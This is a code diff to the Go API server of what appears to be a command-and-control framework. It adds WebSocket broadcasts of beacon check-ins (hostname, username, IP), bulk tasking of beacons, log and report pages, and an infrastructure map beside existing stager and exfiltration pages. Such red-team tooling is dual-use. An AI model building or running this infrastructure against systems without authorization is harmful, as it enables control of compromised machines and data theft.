@@ -1194,6 +1194,16 @@ func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request)
 			req.Beacon.ID, dnsServerID)
 	}
 
+	// Broadcast beacon update to WebSocket clients
+	BroadcastBeaconUpdate(map[string]interface{}{
+		"id":         req.Beacon.ID,
+		"hostname":   req.Beacon.Hostname,
+		"username":   req.Beacon.Username,
+		"os":         req.Beacon.OS,
+		"ip_address": req.Beacon.IPAddress,
+		"last_seen":  req.Beacon.LastSeen,
+	})
+
 	api.sendSuccess(w, "beacon registered", map[string]interface{}{
 		"beacon_id":     req.Beacon.ID,
 		"dns_server_id": dnsServerID,
@@ -2995,11 +3005,18 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	router.HandleFunc("/stager", api.handleStagerPage).Methods("GET")
 	router.HandleFunc("/exfils", api.handleExfilsPage).Methods("GET")
 	router.HandleFunc("/users", api.handleUsersPage).Methods("GET")
+	router.HandleFunc("/logs", api.handleLogsPage).Methods("GET")
+	router.HandleFunc("/report", api.handleReportPage).Methods("GET")
 
-	// Serve static files (CSS, JS, images)
+	// Serve static files (CSS, JS, images) - support both /web/static/ and /static/
+	staticHandler := http.StripPrefix("/static/", http.FileServer(http.Dir(filepath.Join(api.config.WebRoot, "static"))))
+	router.PathPrefix("/static/").Handler(staticHandler)
 	router.PathPrefix("/web/static/").Handler(
 		http.StripPrefix("/web/static/", http.FileServer(http.Dir(filepath.Join(api.config.WebRoot, "static")))),
 	)
+
+	// WebSocket endpoint (auth via cookie)
+	router.HandleFunc("/ws", api.handleWebSocket).Methods("GET")
 
 	// Public API endpoints (no auth required) - with strict rate limiting
 	authRouter := router.PathPrefix("/api/auth").Subrouter()
@@ -3066,6 +3083,17 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 
 	// Task management endpoints
 	operatorRouter.HandleFunc("/tasks/{id}/status", api.handleUpdateTaskStatus).Methods("PATCH")
+
+	// Bulk operation endpoints
+	operatorRouter.HandleFunc("/tasks/bulk", api.handleBulkTaskAction).Methods("POST")
+	operatorRouter.HandleFunc("/beacons/bulk/task", api.handleBulkBeaconTask).Methods("POST")
+
+	// Log viewing endpoints
+	operatorRouter.HandleFunc("/logs", api.handleGetLogs).Methods("GET")
+	operatorRouter.HandleFunc("/logs/files", api.handleListLogFiles).Methods("GET")
+
+	// Infrastructure map endpoint
+	operatorRouter.HandleFunc("/infrastructure", api.handleGetInfrastructure).Methods("GET")
 
 	// DNS server endpoints (API key auth required) - with high rate limits
 	dnsRouter := router.PathPrefix("/api/dns-server").Subrouter()
@@ -3136,4 +3164,12 @@ func (api *APIServer) handleStagerPage(w http.ResponseWriter, r *http.Request) {
 
 func (api *APIServer) handleExfilsPage(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "exfils.html"))
+}
+
+func (api *APIServer) handleLogsPage(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "logs.html"))
+}
+
+func (api *APIServer) handleReportPage(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "report.html"))
 }
